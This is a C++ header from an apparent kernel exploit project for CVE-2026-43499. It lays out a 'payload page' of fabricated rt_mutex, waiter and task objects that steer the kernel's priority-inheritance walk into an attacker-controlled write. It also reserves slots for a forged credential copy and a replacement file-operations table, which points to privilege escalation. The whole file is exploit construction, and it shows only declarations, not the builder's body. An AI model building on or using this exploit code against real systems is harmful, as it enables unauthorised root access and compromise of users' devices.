#pragma once
/** @file backend/cve_2026_43499/memory/payload_page.hpp
 *  The payload page: the objects the erase write has to find where it lands.
 *
 *  Measured shape, taken from the retired tree's prepare_skb_payload (compact branch) and kept field
 *  for field: a fabricated rt_mutex whose owner word says it is held, a fabricated rt_mutex_waiter
 *  whose tree node already carries the erase tuple, the task and lock pointers that connect the two,
 *  and a fabricated task whose priority is above the real-time threshold -- a lower one never reaches
 *  the erase. The tuple lives in the page and not in the fragment because the two are different
 *  objects: the fragment is what the stamp carries onto the kernel stack, the page is what the walk
 *  reaches once the stamp has pointed the stale waiter at it.
 *
 *  The tuple itself is not encoded here. It is the arm the request produces, so the same encoder the
 *  fragment path uses fills it, and the page and the fragment cannot disagree about its shape.
 *
 *  Every offset is an input. Where a kernel version puts a field is that version's business, so the
 *  numbers arrive from the profile; a slot of zero means the profile did not declare it and is a
 *  named refusal rather than a default, and a field that would fall outside the page is refused
 *  before any byte changes. Nothing here issues a call, allocates or reads: it is a pure function
 *  over a caller's buffer, which is why it can be pinned on the host against the retired values.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/memory/write_encoder.hpp"
#include "backend/cve_2026_43499/memory/write_layout.hpp"
#include "backend/cve_2026_43499/memory/write_request.hpp"

namespace ghostlock::backend::cve_2026_43499::memory {
    /** Where the page's own objects sit, page-relative: the profile's payload addresses less the page
     *  base. Each of the five is a slot the profile declares; a zero is refused. */
    struct PayloadSlots final {
        /** The fabricated lock. */
        std::size_t lock = 0U;
        /** The fabricated waiter's first word. */
        std::size_t waiter = 0U;
        /** The fabricated task. */
        std::size_t fake_task = 0U;
        /** Where the credential copy is laid out. Kept here because the profile declares it beside
         *  the others and a reader of the page wants the whole layout in one place. */
        std::size_t cred_copy = 0U;
        /** Where the replacement file operations sit. Same reason. */
        std::size_t fops_table = 0U;
    };

    /** The fabricated lock's fields, lock-relative. The kernel's own layout; the numbers are the
     *  retired table's, so they belong to the profile and arrive with it. */
    struct LockFields final {
        /** The owner word. The low bit set means the lock is held, which is what makes the walk take
         *  the slow path instead of returning early. Zero is what the retired page writes here. */
        std::size_t owner = 0U;
        /** The spinlock the walk takes before it reads the list. */
        std::size_t wait_lock = 0U;
        /** The list head the walk descends through. */
        std::size_t wait_list = 0U;
        /** The first list node, which points back at the fabricated waiter's first word. */
        std::size_t list_link = 0U;
    };

    /** The fabricated waiter's fields, waiter-relative. The first three are the words the walk reads
     *  before it reaches the tuple; the tuple is filled by the encoder from the request. */
    struct WaiterFields final {
        /** The first word: the retired page writes one here, and the lock's list node points at it. */
        std::size_t head_word = 0U;
        /** The second and third words, both cleared. */
        std::size_t head_next = 0U;
        std::size_t head_prev = 0U;
        /** Where the erase tuple's first word sits, and its two neighbours: the offsets the encoder
         *  writes the arm at. */
        std::size_t pc = 0U;
        std::size_t right = 0U;
        std::size_t left = 0U;
        /** The task this waiter belongs to. */
        std::size_t task = 0U;
        /** The lock it waits on. */
        std::size_t lock = 0U;
        /** The wake state, cleared. */
        std::size_t wake_state = 0U;
        /** The waiter's priority, which decides where the walk places it. */
        std::size_t prio = 0U;
        /** The deadline word, cleared. */
        std::size_t deadline = 0U;
        /** The wait-wake context, cleared. */
        std::size_t ww_ctx = 0U;
    };

    /** The fabricated task's fields, task-relative. The first three are what the walk reads; the
     *  pi fields are cleared so the fabricated task looks like one with no inherited priority. */
    struct TaskFields final {
        std::size_t usage = 0U;
        std::size_t prio = 0U;
        std::size_t normal_prio = 0U;
        std::size_t pi_lock = 0U;
        std::size_t pi_waiters = 0U;
        std::size_t pi_top_task = 0U;
        std::size_t pi_blocked_on = 0U;
        std::size_t group = 0U;
    };

    /** The values that go into the fabricated objects. The priorities are not decoration: the waiter
     *  must outrank what it waits behind and the task must be above the real-time threshold, or the
     *  walk stops before the erase. Both are profile values, because both are device facts. */
    struct PayloadValues final {
        std::uint32_t task_usage = 0U;
        std::uint32_t task_prio = 0U;
        std::uint32_t waiter_prio = 0U;
    };

    /** Everything the page is built from. No member has a default that a caller could leave out and
     *  still get a page: the checks below refuse a zero slot rather than guess one. */
    struct PayloadPageInputs final {
        PayloadSlots slots{};
        LockFields lock{};
        WaiterFields waiter{};
        TaskFields task{};
        PayloadValues values{};
        /** The word the fabricated lock's list points at: the waiter's first word address. */
        std::uint64_t waiter_word = 0U;
        /** Where the fabricated task is, which is also what the waiter's task field points at. */
        std::uint64_t fake_task = 0U;
        /** Where the fabricated lock is, which is what the waiter's lock field points at. */
        std::uint64_t fake_lock = 0U;
        /** 退役 spray.cpp 的权威（slide_init_task/slide_root_task_group/slide_init_task ✓）：
         *  waiter.task 指向**真的** init_task、task.group 指向真 root_task_group、pi_top_task 指向 init_task，
         *  三者都是"镜像偏移 | 线性映射基"的形式；为零表示未提供（调用方须具名拒绝）。 */
        std::uint64_t waiter_task = 0U;
        std::uint64_t task_group = 0U;
        std::uint64_t pi_top_task = 0U;
        /** The target's pointer width, which every pointer-sized field is written at. */
        std::size_t pointer_bytes = sizeof(std::uintptr_t);
    };

    /** Why a page was refused. Names follow the single table. */
    enum class PayloadPageVerdict : unsigned char {
        Ok = 0,
        /** The buffer cannot hold the layout, or a field falls outside it. */
        NoRoom = 1,
        /** A slot or a field offset the profile did not declare. */
        SlotsInvalid = 2,
        /** A pointer width this build cannot write. */
        WidthInvalid = 3,
    };

    [[nodiscard]] constexpr const char *payload_page_verdict_name(PayloadPageVerdict verdict) noexcept {
        switch (verdict) {
            case PayloadPageVerdict::Ok: return "ok";
            case PayloadPageVerdict::NoRoom: return "budget-exceeded";
            case PayloadPageVerdict::SlotsInvalid: return "tuning-missing";
            case PayloadPageVerdict::WidthInvalid: return "width-mismatch";
        }
        return "unknown";
    }

    /**
     *  Lay the page out. All or nothing: every offset is checked against @p capacity before a byte is
     *  written, so a refusal leaves the buffer exactly as it was and a half-built page -- which the
     *  walk would read as a real object -- cannot exist.
     *
     *  @param page      The page to fill. A null pointer is refused.
     *  @param capacity  How many bytes @p page holds.
     *  @param inputs    The layout, the values and the three addresses, all from the profile.
     *  @param request   The write this page is prepared for; its target decides the tuple.
     *  @param layout    The layout the request resolved to; its value and parent decide the tuple.
     *  @return          Ok, or a named refusal.
     *  @note            Pure: the same inputs always produce the same bytes, which is what lets the
     *                   host test pin them against the retired values.
     */
    [[nodiscard]] PayloadPageVerdict build_payload_page(std::uint8_t *page, std::size_t capacity,
                                                        const PayloadPageInputs &inputs,
                                                        const WriteRequest &request,
                                                        const WriteLayout &layout) noexcept;
}  // namespace ghostlock::backend::cve_2026_43499::memory
